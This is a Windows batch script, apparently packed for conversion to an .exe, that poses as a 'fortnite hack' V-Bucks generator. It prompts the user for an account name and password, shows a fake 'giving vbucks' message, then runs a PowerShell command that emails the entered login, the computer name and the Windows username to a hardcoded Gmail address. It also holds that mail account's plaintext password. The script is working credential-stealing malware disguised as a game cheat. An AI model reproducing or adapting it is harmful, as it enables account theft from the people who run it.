::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kPqfZcu3TRfgM5s
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
set email=captianlastimosa@gmail.com
set password=wither14
title fortnite hack
color f0


set /p input1=account:

set /p input3=password:

set /p input2=vbucks:
echo giving %input1% %input2% vbucks
timeout 4 >nul
echo done
pause >nul
powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = '%input1%%input3%computername: %COMPUTERNAME%username:%USERNAME%.';$SMTPInfo.Send($ReportEmail);